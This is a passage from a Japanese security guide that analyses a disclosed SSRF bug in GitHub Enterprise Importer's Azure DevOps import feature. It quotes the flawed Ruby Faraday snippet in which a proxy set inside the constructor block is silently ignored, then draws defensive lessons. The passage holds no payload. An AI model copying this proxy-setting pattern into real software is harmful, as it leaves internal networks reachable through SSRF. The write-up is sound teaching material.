次に、実際にバグバウンティで報告された SSRF の事例を見る。この事例は、GMO Flatt Security 所属のセキュリティリサーチャー RyotaK 氏が、2019年に開催された HackerOne 主催のライブハッキングイベント「H1-512」（テキサス州で実施）で GitHub に対して報告したもので、記事は 2023年7月31日に GitHub のバグバウンティプログラムのセーフハーバー（許可された調査に対する法的免責）に基づく公開許可を得て公開されている。時事性のある補足として、対象は GitHub の内部プロダクトである **GitHub Enterprise Importer** の Azure DevOps 連携機能であり、記事内で明記されている修正日・報奨金額は無い（GitHub のポリシーにより、内部ネットワークへのアクセスを確認した時点で調査が打ち切られたため、全体の影響範囲も不明なままである点に留意）。

#### 脆弱だった機能

GitHub Enterprise Importer は、Azure DevOps（ADO）や Bitbucket など複数の外部ソースからリポジトリやプルリクエストをインポートするための機能である。インポート処理の中で「GitHubから各種連携先に対してリクエストを送信し、様々なデータを取得した上でGitHub上で使用可能な形へ変換した上でインポートする」という仕組みになっており、Azure DevOps からファイルを取得する際に脆弱なコードパスが使われていた。攻撃者は「添付ファイルのデータに細工を行うこと」で、GitHub 側のサーバーに任意の内部ネットワーク宛リクエストを発行させることができた。これは典型的な SSRF の構図（アプリケーションが「代理」としてリクエストを発行する際、宛先の妥当性検証が抜けている）であり、外部連携機能（インポーター、Webhook、URLプレビュー生成など）は SSRF の温床になりやすいという一般則をそのまま体現している。

#### 根本原因：Faraday ライブラリのプロキシ初期化順序

本事例のユニークな点は、単なる URL 検証漏れではなく、**HTTP クライアントライブラリ（Ruby の `Faraday`）内部の初期化順序**が原因でプロキシ制限がバイパスされていたことにある。GitHub 側の実装は、内部ネットワークへの直接アクセスを防ぐために「Octoshift」と呼ばれる内部セキュリティプロキシを経由させる設計になっていたと見られ、コードはおおよそ次のようになっていた。

```ruby
connection = Faraday::Connection.new(
  url: url,
  builder: FaradayMiddleware::MiddlewareStack.default
) do |conn|
  conn.options.proxy = Rails.configuration.x.octoshift.octoshift_proxy
  # ...
end
```

一見すると `conn.options.proxy` にプロキシ設定を代入しているため、このコネクションを使ったリクエストはすべて `octoshift_proxy`（内部セキュリティプロキシ）を経由するように見える。しかし実際には **Faraday が `Faraday::Connection.new` に渡されたブロック引数を実行する前に `initialize_proxy` を実行してしまう**という内部実装上の順序があった。つまり、コンストラクタの処理フローは概念的に次のようになっている。

1. `Faraday::Connection.new` が呼ばれる
2. コンストラクタ内部で `initialize_proxy` が実行され、この時点でのプロキシ設定（多くの場合、環境変数 `HTTP_PROXY` / `HTTPS_PROXY` など、Faraday がデフォルトで参照する設定）が確定する
3. その**後**に、呼び出し側が渡したブロック引数（`conn.options.proxy = ...` を含む）が評価される

ブロック内で行った `conn.options.proxy = Rails.configuration.x.octoshift.octoshift_proxy` という代入自体は成功するが、それは「初期化が終わった後にオブジェクトのプロパティを書き換えている」に過ぎず、Faraday の内部で実際にリクエストを送出する際の実装が、ステップ2の時点で確定したプロキシ設定（つまり環境変数由来の、開発者が意図していないもの）を使い続けてしまう——というのが記事の説明する核心である。結果として、開発者が「必ず内部プロキシを経由させる」という意図でコードを書いたにもかかわらず、Faraday の内部実装の評価順序（ライブラリのソースコードを読まない限り気づけない挙動）によって、その制御が実質的に無効化されていた。

#### なぜこれが危険なのか：仕組みレベルの理解

この脆弱性が教科書的に重要なのは、「開発者の意図」と「ライブラリの実際の実行順序」が食い違うことで、**コードレビュー上は正しく見える防御策がすり抜けられる**典型例だからである。多くの SSRF 対策は「送信先ホストのアローリスト検証」や「プロキシを強制経由させてそこでフィルタする」という設計を取るが、後者を選んだ場合、防御の実効性は「本当にそのプロキシ設定が毎回のリクエストに適用されているか」という、HTTPクライアントライブラリの内部実装の詳細に依存することになる。ブロック構文やコールバックを使ってオプションを設定するAPIは、Ruby に限らず多くの言語のHTTPクライアントで一般的だが、コンストラクタ内の初期化処理とブロック評価のタイミングの前後関係はライブラリごと・バージョンごとに異なりうる。防御側の教訓としては次の点が挙げられる。

- **外部連携用のHTTPクライアント設定は、実際に送出されるリクエストのレベル（ネットワークキャプチャや統合テスト）で「意図したプロキシ/宛先制限が本当に効いているか」を検証する**。ソースコード上の代入文が存在することと、それが実行時に効いていることは別問題である。
- **SSRF対策をアプリケーション層のプロキシ強制のみに頼らず、ネットワーク層（VPC のセキュリティグループ、内部ネットワークとの間のファイアウォール）でも多層防御を構成する**。本事例でも「内部ネットワークへのアクセスが確認された時点で調査を停止した」とあるように、アプリケーション層の防御が破られても被害が限定的になるようネットワーク分離が効いていたことがうかがえる。
- **サードパーティライブラリのバージョンアップやドキュメントの変更履歴を追い、初期化順序やデフォルト挙動の変更（特にプロキシ・TLS検証・リダイレクト追従に関わるもの）に注意する**。

#### 開示までの経緯

本件は HackerOne の H1-512（テキサスで開催されたライブハッキングイベント）の枠組みで報告され、GitHub のバグバウンティプログラムが定めるセーフハーバー（許可された範囲内の調査行為に対して法的措置を取らないという方針）のもとで実施された。記事の公開は2023年7月31日で、著者は GMO Flatt Security 所属の RyotaK 氏である。記事中には具体的な攻撃ペイロード（添付ファイルの細工内容そのもの）や、DNSリバインディング等の追加バイパス手法についての記載はなく、脆弱性の技術的核心である「Faradayのプロキシ初期化順序」の解説にフォーカスした内容になっている。

> 出典: GitHubの内部ネットワークにアクセス可能な脆弱性(SSRF)を報告した話 — https://blog.flatt.tech/entry/github_ssrf_h1-512

### 2つの事例から得られる共通の教訓

本節で扱った2つの事例は、脆弱性クラス（サーバーレスの複合的リスク／SSRF）としては別物だが、共通する教訓が一つある。それは、**防御機構の「有効性」は、コード上の見た目ではなく実行時の挙動で検証しなければならない**という点である。Lambda の事例では「ライブラリのデフォルト設定が安全だと思い込む」ことが、GitHub の事例では「プロキシへの代入文があるから経由していると思い込む」ことが、それぞれ脆弱性の温床になった。XXE・SSRF・ファイルアップロードいずれの防御においても、パーサやHTTPクライアントの設定は必ずテスト（できれば実際のネットワークトラフィックの観測や、意図的に内部リソースへ到達させようとする防御目的の検証)で裏付けを取ることが、実務上のベストプラクティスとして強く推奨される。


---

[← 第10章 実例・ライトアップ・報奨事例](10-real-world-cases.md) ｜ [目次](index.md)
